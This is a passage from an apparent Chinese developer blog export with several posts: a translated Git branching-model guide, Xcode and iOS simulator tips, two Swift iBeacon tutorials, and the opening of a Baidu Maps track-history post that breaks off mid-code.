    <content type="text"><![CDATA[我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。——王小波《爱你就像爱生命》 前言 本文翻译自“A successful Git branching model” 英文原文请点击此处查看 正文 在这篇文章中，我将展示我一年前曾经介绍过的用于我部分项目（无论是在工作还是私人）的开发模式，并且已经证明是非常成功的。我有写这篇文章的打算已经很久了，但直到今天我才有时间彻底的完成它。我不会谈论关于项目的任何细节，仅仅讨论关于分支策略和发布管理。 为什么git？ 关于专业人士的全面讨论以及Git和集中的源代码控制系统的利弊比较，请看这里。那是一个充满了硝烟的战场。作为开发人员，如今我喜欢Git要远超其他工具。Git真正的改变了开发人员想要合并和构建分支的方式。我从经典的CVS / Subversion世界一路走来，合并/分支一直被认为是一个可怕的（“合并冲突要小心，他们会咬你！”）而且这些事你仅仅偶尔做一次。 但是使用Git，这些操作非常简洁和高效，它们也被称作日常工作流程的核心部分之一。例如，在CVS / Subversion 书籍中，分支和合并将在后面的章节（高级用户）中优先讨论，而在 每一本 Git 书中，它已经在第3章（基础知识）中讨论过。 由于其简单性和重复性，分支和合并不再是令人害怕的事情。版本控制工具可以帮助快速的进行分支/合并。 工具到此为止，让我们来看看开发模型。我在这里展示的模型本质上只是一系列的步骤，每个团队成员都必须遵循这些过程来实现可管理的软件开发过程。 分散但集中 我们使用的，且与这个分支模型配合良好的仓库，他有一个“真正”的中央仓库。注意，这个库只是被认为是中央仓库(因为Git是一个分布式的版本控制工具，在技术层面没有所谓的中央仓库)。我们将会为这个仓库起名为origin，因为所有的Git用户对这个名字都比较熟悉。 每个开发者从origin拉取和推送代码。除了集中式的推送拉取外，每个开发者也可以从别的开发者处拉取代码，组成一个子团队。例如当与两个或者更多的人开发一个大的功能时，在将代码推送到origin之前，这种代码管理模式将非常有用。在上图中，存在Alice和Bob，Alice和David，Clair和David三个子团队。 技术上而言，这只不过意味着Alice定义了一个远程Git仓库，起名为bob，实际上指向Bob的版本库，反之亦然(Bob定义了一个远程Git仓库，起名为alice，实际上指向Alice的版本库)。 主分支 在核心地方，当前开发模型受到了已存在模型的很大启发。集中式的版本库有两个永久存在的主分支： master分支 develop分支 origin的master分支每个Git用户都很熟悉。平行的另外一个分支叫做develop分支。 我们认为origin/master这个分支上HEAD引用所指向的代码都是可发布的。 我们认为origin/develop这个分支上HEAD引用所指向的代码总是反应了下一个版本所要交付功能的最新的代码变更。一些人管它叫“整合分支”。它也是自动构建系统执行构建命令的分支。 当develop分支上的代码达到了一个稳定状态，并且准备发布时，所有的代码变更都应该合并到master分支，然后打上发布版本号的tag。具体如何进行这些操作，我们将会讨论 因此，每次代码合并到master分支时，它就是一个人为定义的新的发布产品。理论上来讲，在这里我们应该非常严格，当master分支有新的提交时，我们应该使用Git的钩子脚本执行自动构建命令，然后将软件推送到生产环境的服务器中进行发布。 辅助性分支 紧邻master和develop分支，我们的开发模型采用了另外一种辅助性的分支，以帮助团队成员间的并行开发，特性的简单跟踪，产品的发布准备事宜，以及快速的解决线上问题。不同于主分支，这些辅助性分支往往只要有限的生命周期，因为他们最终会被删除。 我们使用的不同类型分支包括: 特性分支 Release分支 Hotfix 分支 上述的每一个分支都有其特殊目的，也绑定了严格的规则：哪些分支是自己的拉取分支，哪些分支是自己的目标合并分支。 从技术角度看，这些分支的特殊性没有更多的含义。只是按照我们的使用方式对这些分支进行了归类。他们依旧是原Git分支的样子。 功能分支 功能分支可以从develop分支拉取建立，最终必须合并会develop分支。特性分支的命名，除了 master， develop， release-*，或hotfix-*以外，可以随便起名。 功能分支(有时候也成主题分支)用于开发未来某个版本新的特性。当开始一个新特性的开发时，这个特性未来将发布于哪个目标版本，此刻我们是不得而知的。功能分支的本质特征就是只要特性还在开发，他就应该存在，但最终这些功能分支会被合并到develop分支(目的是在新版本中添加新的功能)或者被丢弃(它只是一个令人失望的试验) 功能分支只存在开发者本地版本库，不在远程版本库。 创建功能分支 当开始开发一个新功能时，从develop分支中创建功能分支 12$ git checkout -b myfeature developSwitched to a new branch "myfeature" 在develop分支整合已经开发完成的功能 开发完成的功能必须合并到develop分支，即添加到即将发布的版本中。 12345678$ git checkout developSwitched to branch 'develop'$ git merge --no-ff myfeatureUpdating ea1b82a..05e9557(Summary of changes)$ git branch -d myfeatureDeleted branch myfeature (was 05e9557).$ git push origin develop --no-ff参数的作用是在合并的时候，会创建一个新的提交对象，即使是fast-forward方式的合并。这就避免了丢失功能分支的历史记录信息以及提交记录信息。比较一下 在后面的例子中，是不可能从Git历史记录中看到一个已经实现了的功能的所有提交对象-除非你去查看所有的日志信息。要想获取整个功能分支信息，在右面的例子中的确是一个头疼的问题，但是如果使用--no-ff参数就没有这个问题。 使用这个参数后，的确创建了一些新的提交对象(那怕是空提交对象)，但是很值得。 不幸的是，我还没有找到一种方法使Git默认的merge操作带着--no-ff参数，但的确应该这样。 发布分支 从develop分支去建立Release分支，Release分支必须合并到develop分支和master分支，Release分支名可以这样起名:release-*。 Release分支用于支持一个新版本的发布。他们允许在最后时刻进行一些小修小改。甚至允许进行一些小bug的修改，为新版本的发布准要一些元数据(版本号，构建时间等)。通过在release分支完成这些工作，develop分支将会合并这些特性以备下一个大版本的发布。 从develop分支拉取新的release分支的时间点是当开发工作已经达到了新版本的期望值。至少在这个时间点，下一版本准备发布的所有目标特性必须已经合并到了develop分支。更远版本的目标特性不必合并会develop分支。这些特性必须等到个性分支创建后，才能合并回develop分支 在release分支创建好后，就会获取到一个分配好即将发布的版本号，不能更早，就在这个时间点。在此之前，develop分支代码反应出了下一版本的代码变更，但是到底下一版本是 0.3 还是 1.0，不是很明确，直到release分支被建立后一切都确定了。这些决定在release分支开始建立，项目版本号等项目规则出来后就会做出。 创建release分支 从develop分支创建release分支。例如1.1.5版本是当前产品的发布版本，我们即将发布一个更大的版本。develop分支此时已经为下一版本准备好了，我们决定下一版的版本号是1.2(1.1.6或者2.0也可以)。所以我们创建release分支，并给分支赋予新的版本号: 1234567$ git checkout -b release-1.2 developSwitched to a new branch "release-1.2"$ ./bump-version.sh 1.2Files modified successfully, version bumped to 1.2.$ git commit -a -m "Bumped version number to 1.2"[release-1.2 74d9424] Bumped version number to 1.21 files changed, 1 insertions(+), 1 deletions(-) 创建好分支并切到这个分支后，我们给分支打上版本号。bump-version.sh是一个虚构的shell脚本，它更改了工作空间的某些文件来反映新版本特征。(当然也可以手动改变这些文件)，然后版本就被提交了。 新的分支会存在一段时间，直到新版本最终发布。在这段时间里，bug的解决可以在这个分支进行(不要在develop分支进行)。此时是严禁添加新的大特性。这些修改必须合并回develop分支，之后就等待新版本的发布。 完成一个release分支 当release分支的准备成为一个真正的发布版本时，一些操作必须需要执行。首先，将release分支合并回master分支(因为master分支的每一次提交都是预先定义好的一个新版本，谨记)。然后为这次提交打tag，为将来去查看历史版本。最后在release分支做的更改也合并到develop分支，这样的话，将来的其他版本也会包含这些已经解决了的bug。 在Git中需要两步完成: 123456$ git checkout masterSwitched to branch 'master'$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes)$ git tag -a 1.2 这样release分支已经完成工作，tag也已经打了。 备注:你可以使用-s or -u 参数为你的tag设置标签签名。 为了保存这些在release分支所做的变更，我们需要将这些变更合并回develop分支。执行如下Git命令: 12345$ git checkout developSwitched to branch 'develop'$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes) 这步有可能会有合并冲突(极有可能，因为我们已经改变了版本号)。如果有冲突，解决掉他，然后提交。 现在我们已经完成了工作，release分支可以删除了，因为我们不在需要他: 12$ git branch -d release-1.2Deleted branch release-1.2 (was ff452fe). Hotfix分支 Hotfix分支从master分支建立，必须合并回develop分支和master分支，为Hotfix分支可以这样起名:hotfix-* Hotfix分支在某种程度上非常像release分支，他们都意味着为某个新版本发布做准备，并且都是预先不可知的。Hotfix分支是基于当前生产环境的产品的一个bug急需解决而必须创建的。当某个版本的产品有一个严重bug需要立即解决，Hotfix分支需要从master分支上该版本对应的tag上进行建立，因为这个tag标记了产品版本 创建hotfix分支 Hotfix分支从master分支进行创建。例如当前线上1.2版本产品因为server端的一个Bug导致系统有问题。但是在develop分支进行更改是不靠谱的，所以我们需要建立hotfix分支，然后开始解决问题: 1234567$ git checkout -b hotfix-1.2.1 masterSwitched to a new branch "hotfix-1.2.1"$ ./bump-version.sh 1.2.1Files modified successfully, version bumped to 1.2.1.$ git commit -a -m "Bumped version number to 1.2.1"[hotfix-1.2.1 41e61bb] Bumped version number to 1.2.11 files changed, 1 insertions(+), 1 deletions(-) 千万别忘记在创建分支后修改版本号。 然后解决掉bug，提交一次或多次。 123$ git commit -m "Fixed severe production problem"[hotfix-1.2.1 abbe5d6] Fixed severe production problem5 files changed, 32 insertions(+), 17 deletions(-) 结束hotfix分支 完成工作后，解决掉的bug代码需要合并回master分支，但同时也需要合并到develop分支，目的是保证在下一版中该bug已经被解决。这多么像release分支啊。 首先，对master分支进行合并更新，然后打tag 备注:你可以使用-s or -u 参数为你的tag设置标签签名。 123456$ git checkout masterSwitched to branch 'master'$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes)$ git tag -a 1.2.1 紧接着，在develop分支合并bugfix代码 12345$ git checkout developSwitched to branch 'develop'$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes) 这里可能会有一些异常情况，当一个release分支存在时，hotfix 分支需要合并到release 分支，而不是develop分支。当release分支的使命完成后，合并回release分支的bugfix代码最终也会被合并到develop分支。(当develop分支急需解决这些bug，而等不到release分支的结束，你可以安全的将这些bugfix代码合并到develop分支，这样做也是可以的)。 最后删除这些临时分支 12$ git branch -d hotfix-1.2.1Deleted branch hotfix-1.2.1 (was abbe5d6). 总结 这个分支模型其实没有什么震撼人心的新东西，这篇文章开始的那个“最大图片”已经证明了他在我们工程项目中的巨大作用。它会形成一种优雅的理想模型，而且很容易理解，该模型也允许团队成员形成一个关于分支和版本发布过程的相同理念。 这里有提供一个高质量的分支模型图的PDF版本。去吧，把它挂在墙上随时快速参考。 Git-分支-模型.pdf 更新：任何需要的小伙伴，这里有一个原图的gitflow-model.src.key文件。 参考 A successful Git branching model]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最佳的iOS开发技巧及小窍门]]></title>
    <url>%2Farchives%2Fed90488b.html</url>
    <content type="text"><![CDATA[我选择沉默的主要原因之一：从话语中，你很少能学到人性，从沉默中却能。假如还想学得更多，那就要继续一声不吭 。——王小波《沉默的大多数》 前言 本文翻译自“Best iOS Development Tips and Tricks” 英文原文请点击此处查看 译者注：文中部分功能涉及到视频演示，视频来源YouTube，请自备梯子。 正文1、如果你想知道项目的确切构建时间，请用下面指令开启Xcode的相关功能。1defaults write com.apple.dt.Xcode ShowBuildOperationDuration -bool YES 2、 提升你Swift项目的构建时间 在Xcode 9.2的发布说明中提到一个可以提升Swift项目构建时间的功能（处于实验阶段），使用buildsystemscheduleinherentlyparallelcommandclutly用户默认值启用。 1defaults write com.apple.dt.Xcode BuildSystemScheduleInherentlyParallelCommandsExclusively -bool NO 提示：根据发布说明这是一个试验阶段的功能，会导致构建阶段内存消耗增加。 3、模拟器和Xcode在全屏模式下共存 能在全屏模式下同时使用Xcode和iOS模拟器，可能是我在Xcode9最喜欢的一个功能。你只需要在终端执行下面的指令开启 1defaults write com.apple.iphonesimulator AllowFullscreenMode -bool YES 如果你想使用更多的模拟器的秘密功能，请开启苹果隐藏的内部菜单栏，你需要在用户根目录创建一个名字为AppleInternal的空文件夹，然后执行下面指令重启模拟器即可。 1sudo mkdir /AppleInternal 新的菜单栏就会出现 4、iOS模拟器录制视频 你可以使用xcrun command-line工具截取模拟屏幕快照或者录制模拟器屏幕视频。 录制视频请执行下面指令 1xcrun simctl io booted recordVideo &lt;文件名&gt;.&lt;文件后缀&gt;. 例如： 1xcrun simctl io booted recordVideo appvideo.mov 快捷键control + c停止视频录制，录制的适配文件默认会在当前目录保存。 5、从Finder共享文件到iOS模拟器 从Xcode9开始，模拟器允许使用Finder扩展直接从Finder窗口共享文件。然而，拖动文件到模拟器放开似乎更加快捷。 然而你也可以使用下面simctl命令做一些和图片/视频文件相似的事情。 1xcrun simctl addmedia booted &lt;PATH TO FILE&gt; 6、使用指纹sudo 如果你想使用指纹作为你Macbook Pro执行sudo时的密码，请编辑/etc/pam.d/sudo文件将下面一行添加在文件上面。 1auth sufficient pam_tid.so 现在你可以使用指纹执行sudo了。 7、使用声音通知调试你的自动布局约束 这将是一个非常好的方式去调试自动布局约束，仅仅在启动的时候传递UIConstraintBasedLayoutPlaySoundOnUnsatisfiable参数，当约束在运行时出现糟糕情况的时候就会播放声音。 1-_UIConstraintBasedLayoutPlaySoundOnUnsatisfiable YES 8、移除Xcode中无效的模拟器 这个小命令将移除Xcode中所有无效的模拟器，所谓无效是指对xcode-select无效的Xcode版本。 1xcrun simctl delete unavailable 你最喜欢的功能是什么？请告诉我。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>xCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之iBeacon篇(二)]]></title>
    <url>%2Farchives%2Fb05dc691.html</url>
    <content type="text"><![CDATA[那一天我二十一岁，在我一生的黄金时代。我有好多奢望。我想爱，想吃，还想再一瞬间变成天上半明半暗的云。我来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。可是我过二十一岁生日时没有预见到这一点。我觉得自己会永远生猛下去，什么也锤不了我。——王小波《黄金时代》 前言 照例，如果只是需要监听iBeacon的demo代码，可以直接点击下载，不需要往下看了😂 如果想了解iBeacon相关信息，请参考iOS蓝牙开发之iBeacon篇(一) 虽然iBeacon也是基于Ble的，从硬件上看也是一套东西，但是Apple公司把他封装成了两套东西，所以在iOS移动端开发来说，这是两个完全不同的东西，调用完全不同框架的api. Apple公司为了省电和隐私限制只能监听指定UUID的iBeacon，无法像安卓一样搜索附近所有的iBeacon信息，虽然iBeacon扫描底层可以获取到附近的所有的iBeacon信息（底层就是获取附近所有的iBeacon然后和当前监听的iBeacon标识对比，然后回调给上层），如果你只是想在你自己的手机上测试下，可以参考AnyiBeacon-iOS这个项目，但是只能作为测试使用，因为涉及到Apple的私有api，是不允许上架App Store的。 想了解iBeacon底层数据协议格式的，可以参考What is the iBeacon Bluetooth Profile 这篇文章。 初始化 在 iOS8.0之后的时候如果想使用iBeacon，必须让用户授权 在info.plist文件里面配置下面的key 123NSLocationAlwaysAndWhenInUseUsageDescription // 推荐NSLocationWhenInUseUsageDescriptionNSLocationAlwaysUsageDescription 在capabilities里面开启Background Modes的 Location updates 由于iBeacon是基于CoreLocation框架的，所以先导入头文件并实例化位置管理者 12import CoreLocationlet locationManager = CLLocationManager() 请求授权并设置代理 12345678override func viewDidLoad()&#123; super.viewDidLoad() // Do any additional setup after loading the view. locationManager.requestAlwaysAuthorization() // 必须要申请权限,否者不会回调扫描到beacons的代理方法 locationManager.delegate = self&#125; 添加需要监听的iBeacon 这个是添加iBeacon信息界面代理回调 123456789101112131415// MARK: AddBeaconextension ItemsViewController: AddBeacon &#123; func addBeacon(item: Item) &#123; items.append(item) tableView.beginUpdates() let newIndexPath = IndexPath(row: items.count - 1, section: 0) tableView.insertRows(at: [newIndexPath], with: .automatic) tableView.endUpdates() startMonitoring(item) // 开始监控 persistItems() // 持久化到本地 &#125;&#125; Item为一个iBeacon信息的数据模型, 即包含如下信息 12345let name: String // 非必须let icon: Int // 非必须let uuid: UUIDlet majorValue: CLBeaconMajorValue // 非必须let minorValue: CLBeaconMinorValue // 非必须 开始监听和停止监听 根据一个iBeacon的参数（iBeacon硬件提供或者自己用iPhone或者mac模拟）初始化一个CLBeaconRegion 两种监听模式 123456789101112func startMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.startMonitoring(for: region) // 低功耗，支持后台监听 locationManager.startRangingBeacons(in: region) // 大功耗，不支持后台监听&#125;// MARK: 根据模型数据初始化一个Beacon Regionfunc asBeaconRegion() -&gt; CLBeaconRegion &#123; return CLBeaconRegion(proximityUUID: uuid, major: majorValue, minor: minorValue, identifier: name)&#125; 如果想停止监听某个iBeacon 123456func stopMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.stopMonitoring(for: region) locationManager.stopRangingBeacons(in: region)&#125; 监听到iBeacon信息回调 开始监听某个Beacon 1234func locationManager(_ manager: CLLocationManager, didStartMonitoringFor region: CLRegion)&#123; print("didStartMonitoringFor\(region)")&#125; 监听到Beacons 12345678910111213141516171819202122232425// MARK: CLLocationManagerDelegateextension ItemsViewController: CLLocationManagerDelegate &#123; func locationManager(_ manager: CLLocationManager, didRangeBeacons beacons: [CLBeacon], in region: CLBeaconRegion) &#123; print("didRangeBeacons \(beacons.count)个") var indexPaths = [IndexPath]() for beacon in beacons &#123; for row in 0..&lt;items.count &#123; // 检测是否是需要监控的beacon if items[row] == beacon &#123; items[row].beacon = beacon indexPaths += [IndexPath(row: row, section: 0)] &#125; &#125; &#125; if let visiblaRows = tableView.indexPathsForVisibleRows &#123; let rowsToUpdate = visiblaRows.filter&#123; indexPaths.contains($0) &#125; for row in rowsToUpdate &#123; // 刷新可见cell上对应的Beacon距离信息 let cell = tableView.cellForRow(at: row) as? ItemCell cell?.refreshLocation() &#125; &#125; &#125; 其他的回调方法 注意： 如果需要监听进入某个区域或者从某个区域离开，则需要在初始化Beacon Region的时候订阅 不然进入和离开区域不回回调 12&gt; region.notifyOnEntry = YES; &gt; region.notifyOnExit = YES; 1234567891011121314151617181920212223// monitoring 监听某个beacon失败 func locationManager(_ manager: CLLocationManager, monitoringDidFailFor region: CLRegion?, withError error: Error)&#123; print("Failed monitoring region\(error.localizedDescription)")&#125;// 位置管理者出现错误信息 func locationManager(_ manager: CLLocationManager, didFailWithError error: Error)&#123; print("Location manager failed \(error.localizedDescription)")&#125;// ranging 监听某个beacon失败 func locationManager(_ manager: CLLocationManager, rangingBeaconsDidFailFor region: CLBeaconRegion, withError error: Error)&#123; print("rangingBeaconsDidFailFor")&#125;// 已经进入到某个区域 func locationManager(_ manager: CLLocationManager, didEnterRegion region: CLRegion) &#123; print("didEnterRegion")&#125;// 已经从某个区域离开 func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; print("didExitRegion")&#125; 关于推送 app现在能显示iBeacon设备，并且还能实时监控它们的距离。但是当app没有处于运行状态时，如iBeacon设备在宠物猫脖子上但是宠物猫跑丢了！ 此时app就需要在猫离开区域的时候通知用户。 在AppDelegate导入通知框架并初始化一个位置管理者 1234import CoreLocationimport UserNotificationsvar locationManager = CLLocationManager() 程序启动的时候，配置位置监听和设置通知 123456789101112func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool &#123; // Override point for customization after application launch. // 注册通知，请求权限 let center = UNUserNotificationCenter.current() center.requestAuthorization(options: [.alert, .sound]) &#123; (granted, error) in &#125; // 设置代理 locationManager.delegate = self return true&#125; 监听目标离开区域并发送本地通知 123456789101112131415extension AppDelegate: CLLocationManagerDelegate&#123; func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; guard region is CLBeaconRegion else &#123; return &#125; let content = UNMutableNotificationContent() content.title = "Forget Me Not" content.body = "Are you forgetting something?" content.sound = .default() let request = UNNotificationRequest(identifier: "iBeaconDemo", content: content, trigger: nil) UNUserNotificationCenter.current().add(request, withCompletionHandler: nil) &#125;&#125; 参考官方文档维基百科iOS 中 iBeacon 开发iBeacon Tutorial with iOS and SwiftHow to detect ibeacon device without knowing UUID in iOS?Detecting beacons via iBeacon Monitoring &amp; Ranging vs CoreBluetooth scanForPeripheralsWithServices]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之iBeacon篇(一)]]></title>
    <url>%2Farchives%2F1f6c5df3.html</url>
    <content type="text"><![CDATA[高山有崖, 林木有枝。忧来无方, 人莫之知。——曹丕《善哉行》 什么是iBeacon 如果只是需要iPhone模拟iBeacon的demo代码，可以点击下载，不需要往下看了😂 你曾经想过用手机在一个大型建筑物中为自己定位吗，比如购物中心，或者博物馆。 当然，GPS可以让你得知自己身处哪一座建筑物里。但是如果想要在这些钢筋混凝土堆砌而成的建筑中获得精确的GPS信号，只能祝你好运了。你所需要的是内置在建筑物中一些设备，（通过它们）让手机获取确定你的位置。 iBeacon是Apple公司开发的一种近场通讯协议，于2013年的WWDC开发者大会推出。当你的手持设备靠近一个Beacon基站时，设备就能够感应到Beacon信号，范围可以从几毫米到50米。因为是一种定位技术，苹果将iBeacon相关的接口放到了CoreLocation.framework。 其工作方式是: 配备有低功耗蓝牙（BLE）通信功能的设备(iBeacon)使用BLE技术向周围发送自己特有的UUID，使用iBeacon的App接收到该UUID的应用软件会根据该UUID采取一些行动。 iBeacon的应用场景 当使用者走进某个博物馆时，会扫描到一个 beacon。这个 beacon 有三个标志符 proximityUUID 是一个整个博物馆统一的值，可以用来标识这个博物馆 major 值用来标识特定的展馆，比如唐代展馆，汉代展馆等等 minor 值标识了特定的一个位置的 beacon，例如定位到使用者正在唐代展馆的唐三彩展品的位置。 这时博物馆的 app 会被系统唤醒，app 可以运行一个比较短的时间。在这段时间内，app 可以根据 beacon 的属性查询到使用者的地理位置（通过查询服务器或者本地数据） 例如在唐代展馆的唐三彩展品位置，之后就可以通过一个 local notification 推送这件展品的简介。用户可以点击这次 local notification 来查看更详细的信息，这样一次导览行为就完成了。 可以充当iBeacon的iOS的设备 iPhone4s 或者 之后的iPhone设备 第三代iPad或者 之后iPad设备 iPad mini 或者 之后iPad mini设备 第五代iPod touch 或者之后iPod touch设备 iMac 或者 MacBookPro iBeacon监听方式 Monitoring：低功耗监听，用来判断设备进出ibeacon围栏，支持后台或app进程杀掉后监听。 Ranging：大功率监听，监听当前设备所在区域内的ibeacon信息，包括rssi，距离，不支持后台监听。 基于这两个特性，我们在使用时就分为前台和后台两个场景来实现ibeacon的检测。 iBeacon监听 你的设备当然不会自动监测iBeacon的，所以首先你得告知它。CLBeaconRegion类代表一个iBeacon。 iBeacon与Core Location关联在一起看上去有点奇怪，因为它就是一个蓝牙设备而已，但是也可以这么认为，那就是iBeacon提供小范围定位功能，而GPS提供的是大范围定位功能。 CLBeaconRegion参数介绍 参数 必要字段 作用 identifier 是 标识字符串 proximityUUID 是 一级标识（eg.标识公司） major 否 二级标识（eg.标识店铺） minor 否 三级标识（eg.标识位置） 手机模拟iBeacon 当想让iOS设备充当iBeacon时，你还需要引入Core Bluetooth框架，但只想检测iBeacon设备，你只需要Core Location就行了。 初始化 初始化配置一个iBeacon的参数 beaconUUID 是一个128位的值，可以使用uuidgen生成，但是生成的某些值不可用，推荐使用我提供的这个 初始化一个蓝牙外设管理者， 12345678910111213private let beaconIdentity = "kitty"private let beaconUUID = "B0702880-A295-A8AB-F734-031A98A512DE"private let beaconMajorValue = UInt16(2)private let beaconMinorValue = UInt16(7)private var peripheraManager: CBPeripheralManager?override func viewDidLoad() &#123; super.viewDidLoad() // Do any additional setup after loading the view, typically from a nib. peripheraManager = CBPeripheralManager(delegate: self, queue: .main)&#125; 监听蓝牙状态改变 在inof.plist文件配置Privacy - Bluetooth Peripheral Usage Description请求蓝牙授权 遵守CBPeripheralManagerDelegate协议 123456789101112131415161718192021extension ViewController: CBPeripheralManagerDelegate&#123; func peripheralManagerDidUpdateState(_ peripheral: CBPeripheralManager) &#123; switch peripheral.state &#123; case .unknown: print("蓝牙未知的") case .resetting: print("蓝牙重置中") case .unsupported: print("蓝牙不支持") case .unauthorized: print("蓝牙未验证") case .poweredOff: print("蓝牙未启动") case .poweredOn: print("蓝牙可用") beaconAdvertising() &#125; &#125;&#125; 配置模拟iBeacon广播数据1234567891011func beaconAdvertising() &#123; guard let uuid = UUID(uuidString: beaconUUID) else &#123; return &#125; let region = CLBeaconRegion(proximityUUID: uuid, major: beaconMajorValue, minor: beaconMinorValue, identifier: beaconIdentity) let regionData = region.peripheralData(withMeasuredPower: nil) let regionAdvertising = regionData as? [String : Any] peripheraManager?.startAdvertising(regionAdvertising) print("开始模拟Beacon广播数据\(regionData)")&#125; 监听是否广播成功 若广播成功，则可作为iBeacon使用 需要监听iBeacon可参考iOS蓝牙开发之iBeacon篇(二) 12345func peripheralManagerDidStartAdvertising(_ peripheral: CBPeripheralManager, error: Error?) &#123; print("正在模拟Beacon广播数据: \(peripheral.isAdvertising) --- 错误信息: \(String(error?.localizedDescription ?? "无"))") stateLbl.text = "正在模拟Beacon广播数据: \n\(peripheral.isAdvertising) \n错误信息: \n\(String(error?.localizedDescription ?? "无"))" stateLbl.textAlignment = .center&#125; 参考官方文档维基百科iOS 中 iBeacon 开发]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(三):历史轨迹记录]]></title>
    <url>%2Farchives%2Fb47045de.html</url>
    <content type="text"><![CDATA[月落乌啼霜满天，江枫渔火对愁眠。姑苏城外寒山寺，夜半钟声到客船。 前言 思 考 要 怎 么 开 始 。。。 嗯 (过了一万年。。。) 最近一直在做一个宠物定位的项目，本来以为只需要参考官方文档接入地图实现功能就可以winner winner chicken dinner了，但是等到我掉以轻心的做到后面再加上历史轨迹疯狂改需求的时候，又双叒叕加上还要百度和谷歌同步实现功能，心中开始有一万只神兽在奔腾，于是、、就有了这篇文章的由来了。 关于历史轨迹 补一张效果图 历史轨迹历经了好几个版本的在几个方案之间来回拉锯，现在终于是。。。还没有定下来具体的方案了🤣 方案一：选时间段查询历史轨迹数据后全部显示在地图上面，然后可以点击播放按钮回放历史轨迹并画线；或者拖动一个UISlideBar滑动条可以切换每一轨迹点并显示轨迹详细信息弹框。 方案二：选时间段查询历史轨迹数据后显示第一个点在地图上面，然后可以通过四个操作按钮（起点，上一个，下一个，终点）切换轨迹点画线并显示轨迹详细信息弹框；或者手动点击切换每一轨迹点并显示轨迹详细信息弹框。 方案三：选时间段查询历史轨迹数据后全部显示在地图上面，然后可以通过四个操作按钮（起点，上一个，下一个，终点）切换轨迹点并显示轨迹详细信息弹框；或者手动点击切换每一轨迹点并显示轨迹详细信息弹框。 方案四五六七八九…待客户和老板定。 问题 方案一：查询轨迹过多导致获取数据比较耗时，显示点比较多画线乱。 方案二：筛选所选时间段的估计点（抽取平均10个点出来，后来又改为5个，在在后来改为服务器配置），画线功能由服务器配置，选择时间段间隔服务器配置。 方案三：在方案二的基础上，分页获取所有数据并全部显示 方案四五六七八九…未知 百度地图历史轨迹开始挖坑 历史古迹无非就是多个位置点构成，所以和上一篇的添加坐标点大头针一样，只是添加多个而已，考虑到控件的重用机制，所以有了下面的代码 1234567891011121314151617181920212223242526// ... 遍历历史古迹数据 创建地图大头针// ... 对每一个坐标反地理编码// ... 在反地理编码里面刷新对应的模型信息地址 并刷新自定义弹框paopaoView- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@"LocationAnnotation"]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@"LocationAnnotation"]; &#125; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@"_small"]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; self.petAnnotationView.isHiddenNoNeeds = YES; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; [annotationView setSelected:YES animated:NO]; // 选中当前的 &#125; return annotationView;&#125; 掉坑里了 如果所有的大头针都共用一个自定义的paopaoView（petAnnotationView）的话，就会导致selectAnnotation:animated:方法没有效果 并且只有最后添加的那一个轨迹带你点击才会调用selectAnnotation:animated: 其他大头针点击都会失效 如果要控制切换轨迹点刷新显示弹框信息，那就需要根据索引先移除当前点，再重新添加重新渲染，而且切换不流畅，会出现莫名的问题 怎么从坑里跳出来？ 1、找大牛 2、查资料 3、习惯有坑，顺其自然 但是 作为一个视这世界上只有两件事是真理：人都会死；程序永远有bug为座右铭的程序猿，当然是选择3啊，但是考虑到这样有可能会被打死，而求人又不如求己的理念，我就开始苦逼的查资料，看官方demo和官方论坛（屎一样的论坛，永远回复：在处理中、感谢你的反馈） 经过我的反复查询资料，不断尝试，最后终于在我的灵机一动下解决了，再次印证了爱迪生的话但那1％的灵感是最重要的，甚至比那99％的汗水都要重要。😂 既然一个轨迹点可以正常的点击显示和隐藏，是不是需要每一个轨迹点大头针都需要绑定一个paopaoView呢 本着实践是检验真理的唯一标准，于是有了以下代码 12345678910111213141516171819202122232425- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; 